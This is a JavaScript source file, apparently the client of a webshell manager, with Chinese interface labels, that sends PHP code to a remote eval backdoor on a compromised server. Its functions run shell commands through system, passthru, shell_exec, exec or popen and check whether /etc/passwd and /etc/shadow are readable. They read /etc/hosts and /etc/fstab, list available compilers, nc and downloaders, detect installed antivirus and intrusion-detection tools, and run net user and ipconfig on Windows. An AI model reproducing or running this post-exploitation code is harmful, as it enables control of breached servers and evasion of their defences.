/**
 * Created by abcdlzy on 15/3/14.
 */
function getPHPVar(){
    var postCode="header('Content-type: text/html; charset=utf8');" +
        "\$dis_func = get_cfg_var('disable_functions');" +
        "function getcfg(\$varname) {" +
        "\$result = get_cfg_var(\$varname);" +
        "if (\$result == 0) {" +
        "return 'No';" +
        "} elseif (\$result == 1) {" +
        "return 'Yes';" +
        "} else {" +
        "return \$result;" +
        "}}" +
        "\$d=array();" +
        "if(function_exists('mysql_get_client_info'))" +
        "\$d[] = \"MySql (\".mysql_get_client_info().\")\";" +
        "if(function_exists('mssql_connect'))" +
        "\$d[] = \"MSSQL\";" +
    "if(function_exists('pg_connect'))" +
        "\$d[] = \"PostgreSQL\";" +
    "if(function_exists('oci_connect'))" +
    "\$d[] = \"Oracle\";" +
    "\$info = array(" +
    "array('服务器当前时间',date('Y/m/d h:i:s',time()))," +
    "array('服务器域名',\$_SERVER['SERVER_NAME'])," +
        "array('服务器IP',gethostbyname(\$_SERVER['SERVER_NAME']))," +
        "array('服务器操作系统',PHP_OS)," +
        "array('服务器软件',\$_SERVER['SERVER_SOFTWARE'])," +
        "array('服务器网页端口',\$_SERVER['SERVER_PORT'])," +
        "array('PHP运行模式',strtoupper(php_sapi_name()))," +
        "array('当前执行文件的路径',\__FILE__)," +
        "array('PHP版本',PHP_VERSION)," +
        "array('PHPINFO支持',(!@eregi(\"phpinfo\",\$dis_func)? 'Yes' : 'No'))," +
    "array('安全模式',getcfg('safe_mode'))," +
    "array('Administrator',(isset(\$_SERVER['SERVER_ADMIN']) ? \$_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from')))," +
    "array('allow_url_fopen',getcfg('allow_url_fopen'))," +
    "array('enable_dl',getcfg('enable_dl'))," +
    "array('display_errors',getcfg('display_errors'))," +
    "array('register_globals',getcfg('register_globals'))," +
    "array('magic_quotes_gpc',getcfg('magic_quotes_gpc'))," +
    "array('内存限制',getcfg('memory_limit'))," +
        "array('POST最大大小',getcfg('post_max_size'))," +
        "array('上传最大大小',(getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed'))," +
        "array('最大解析时间',getcfg('max_execution_time').' second(s)')," +
        "array('禁用函数',(\$dis_func ? \$dis_func : 'No'))," +
        "array('支持的数据库',implode(', ', \$d))," +
        "array('CURL支持',function_exists('curl_version') ? 'Yes' : 'No')," +
        "array('Open base dir',getcfg('open_basedir'))," +
        "array('Safe mode exec dir',getcfg('safe_mode_exec_dir'))," +
        "array('Safe mode include dir',getcfg('safe_mode_include_dir'))," +
        ");" +
        "echo json_encode(['SQLINFO'=>\$d,'PHPINFO'=>\$info]);";

    doEvalCode(postCode,function(data){
        document.getElementById('varContainer').innerHTML="";
        var jsonObj=JSON.parse(data);
        document.getElementById('varContainer').innerHTML+='<h3>已安装数据库组件</h3>';
        document.getElementById('varContainer').innerHTML+='<hr/>';
        for(var i=0;i<jsonObj.SQLINFO.length;i++){
            document.getElementById('varContainer').innerHTML+='<div class="form-group">';
            document.getElementById('varContainer').innerHTML+='<label for="input01" class="col-sm-12">'+jsonObj.SQLINFO[i]+'</label>';
            document.getElementById('varContainer').innerHTML+='</div>';
        }
        document.getElementById('varContainer').innerHTML+='<br/><br/>';
        document.getElementById('varContainer').innerHTML+='<h3>服务器环境</h3>';
        document.getElementById('varContainer').innerHTML+='<hr/>';
        for(var i=0;i<jsonObj.PHPINFO.length;i++){
            document.getElementById('varContainer').innerHTML+='<div class="form-group">';
            document.getElementById('varContainer').innerHTML+='<label for="input01" class="col-sm-3 control-label">'+GB2312UnicodeConverter.ToGB2312(jsonObj.PHPINFO[i][0])+'</label>';
            document.getElementById('varContainer').innerHTML+='<label for="input01" class="col-sm-9 control-label" style="text-align: left;">'+jsonObj.PHPINFO[i][1]+'</label>';
            document.getElementById('varContainer').innerHTML+='</div>';
        }

        document.getElementById('varContainer').innerHTML+='<div class="form-group">';
        document.getElementById('varContainer').innerHTML+='<br/>';
        document.getElementById('varContainer').innerHTML+='</div>';

    });
}

var GB2312UnicodeConverter = {
    ToUnicode: function (str) {
        return escape(str).toLocaleLowerCase().replace(/%u/gi, '\\u');
    }
    , ToGB2312: function (str) {
        return unescape(str.replace(/\\u/gi, '%u'));
    }
};

function getSecInfo(){
    var postCode="header('Content-type: text/html; charset=utf8');" +
        "function execute(\$cfe) {" +
        "\$res = '';" +
        "if (\$cfe) {" +
        "if(function_exists('system')) {" +
        "@ob_start();" +
        "@system(\$cfe);" +
        "\$res = @ob_get_contents();" +
        "@ob_end_clean();" +
        "} elseif(function_exists('passthru')) {" +
        "@ob_start();" +
        "@passthru(\$cfe);" +
        "\$res = @ob_get_contents();" +
        "@ob_end_clean();" +
        "} elseif(function_exists('shell_exec')) {" +
        "\$res = @shell_exec(\$cfe);" +
        "} elseif(function_exists('exec')) {" +
        "@exec(\$cfe,\$res);" +
        "\$res = join(\"\n\",\$res);" +
    "} elseif(@is_resource(\$f = @popen(\$cfe,\"r\"))) {" +
    "\$res = '';" +
    "while(!@feof(\$f)) {" +
    "\$res .= @fread(\$f,1024);}" +
    "@pclose(\$f);" +
    "}}" +
    "return \$res;" +
    "}" +
    "function which(\$pr) {" +
    "\$path = execute(\"which \$pr\");" +
    "return (\$path ? \$path : \$pr);}" +
        "\$out=array();" +
        "\$is_win=DIRECTORY_SEPARATOR == '\\\\';" +
        "if( !\$is_win ) {" +
        "\$userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');" +
        "\$danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');" +
        "\$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');" +
        "\$out[]=array('/etc/passwd 可读性', @is_readable('/etc/passwd') ? \"yes\" : 'no');" +
    "\$out[]=array('/etc/shadow 可读性', @is_readable('/etc/shadow') ? \"yes\" : 'no');" +
    "\$out[]=array('操作系统版本', @file_get_contents('/proc/version'));" +
    "\$out[]=array('登陆界面', @file_get_contents('/etc/issue.net'));" +
    "\$safe_mode = @ini_get('safe_mode');" +
        "if(!\$GLOBALS['safe_mode']) {" +
        "\$temp=array();" +
        "foreach (\$userful as \$item)" +
        "if(which(\$item)){\$temp[]=\$item;}" +
        "\$out[]=array('有用的函数', implode(', ',\$temp));" +
        "\$temp=array();" +
        "foreach (\$danger as \$item)" +
        "if(which(\$item)){\$temp[]=\$item;}" +
        "\$out[]=array('危险函数', implode(', ',\$temp));" +
        "\$temp=array();" +
        "foreach (\$downloaders as \$item)" +
        "if(which(\$item)){\$temp[]=\$item;}" +
        "\$out[]=array('下载命令', implode(', ',\$temp));" +
        "\$out[]=array('Hosts', @file_get_contents('/etc/hosts'));" +
        "\$out[]=array('硬盘空间', execute('df -h'));" +
        "\$out[]=array('挂载选项', @file_get_contents('/etc/fstab'));" +
        "echo json_encode(['resInfo'=>\$out]);" +
        "}} else {" +
        "echo mb_convert_encoding('windows system version:'.execute('ver'), 'utf-8', 'GBK,UTF-8,ASCII');" +
        "echo mb_convert_encoding('\naccount setting:\n'.execute('net accounts'), 'utf-8', 'GBK,UTF-8,ASCII');" +
        "echo mb_convert_encoding('system users:'.execute('net user'), 'utf-8', 'GBK,UTF-8,ASCII');" +
        "echo mb_convert_encoding('IP config:'.execute('ipconfig -all'), 'utf-8', 'GBK,UTF-8,ASCII');" +
        "}" +
        "";

    doEvalCode(postCode,function(data){
        if(data.indexOf('windows system version')>-1){
            document.getElementById('secInfoContainer').innerHTML="";
                document.getElementById('secInfoContainer').innerHTML+='<div class="row"> ' +
                '<div class="col-md-12">' +
                '<section class="tile color transparent-black">' +
                '<div class="tile-header">' +
                '<h3>windows系统相关安全信息</h3>' +
                '</div>' +
                '<div class="tile-body"> <textarea class="form-control" id="execShow" rows="40" readonly style="line-height: normal;white-space: pre!important;background-color: rgba(0, 0, 0, 0.21);color: #FFF;margin: 0px -0.9375px 0px 0px;width: 100%;">'+data+
                '</textarea></div></section> </div></div>';
        }
        else
        {
            var jsonObj=JSON.parse(data);
            document.getElementById('secInfoContainer').innerHTML="";
            for(var i=0;i<jsonObj.resInfo.length;i++) {
                document.getElementById('secInfoContainer').innerHTML+='<div class="row"> ' +
                '<div class="col-md-12">' +
                '<section class="tile color transparent-black">' +
                '<div class="tile-header">' +
                '<h3>'+GB2312UnicodeConverter.ToGB2312(jsonObj.resInfo[i][0])+'</h3>' +
                '</div>' +
                '<div class="tile-body"> <textarea class="form-control" id="execShow" rows="1" readonly style="line-height: normal;white-space: pre!important;background-color: rgba(0, 0, 0, 0.21);color: #FFF;margin: 0px -0.9375px 0px 0px;width: 100%;">'+jsonObj.resInfo[i][1]+
                '</textarea></div></section> </div></div>';
            }
        }



    });

}
